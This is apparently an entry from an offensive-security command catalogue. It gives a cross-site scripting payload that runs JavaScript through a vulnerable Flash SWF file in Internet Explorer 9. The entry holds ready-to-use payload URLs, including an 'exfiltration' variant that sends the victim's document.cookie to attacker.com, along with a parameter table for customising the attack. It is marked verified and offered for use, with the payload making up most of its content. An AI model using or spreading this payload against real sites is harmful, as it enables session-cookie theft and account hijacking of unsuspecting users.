---
type: command
executor: browser
data: >-
  http://0me.me/demo/xss/xssproject.swf?js=w=window.open('invalidfileinvalidfileinvalidfile','target');setTimeout('alert(w.document.location);w.close();',1);
tags:
  - xss
  - swf-flash
  - ie9
platforms:
  - web
  - browser
verified: true
validated: true
---

# xss-swf-payload-ie9

## Command

Visit the following URL in Internet Explorer 9:

```
http://0me.me/demo/xss/xssproject.swf?js=w=window.open('invalidfileinvalidfileinvalidfile','target');setTimeout('alert(w.document.location);w.close();',1);
```

## Description

This command uses an indirect JS execution method for IE9, opening a new window with a payload URL and alerting its location after a short delay before closing it, bypassing direct execution restrictions in Flash.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| js | JavaScript using window.open and setTimeout for delayed execution | Yes |
| payload_url | Invalid or target URL to open in new window (placeholder for actual payload) | Yes |
| delay | Timeout in milliseconds before alerting and closing | Yes |
| SWF URL base | Base URL of the vulnerable SWF file | Yes |

## Examples

### Basic Usage

```
http://0me.me/demo/xss/xssproject.swf?js=w=window.open('invalidfileinvalidfileinvalidfile','target');setTimeout('alert(w.document.location);w.close();',1);
```

### Advanced Usage (Exfiltration)

```
http://0me.me/demo/xss/xssproject.swf?js=w=window.open('http://attacker.com/steal?data='+document.cookie,'target');setTimeout('w.close();',1);
```

## Expected Output

A new window briefly opens, followed by an alert displaying the window's location (e.g., the payload URL), then the window closes. Successful exfiltration appears in attacker server logs.

## Related

- [[procedures/Exploit-XSS-in-SWF-Flash-Application]]
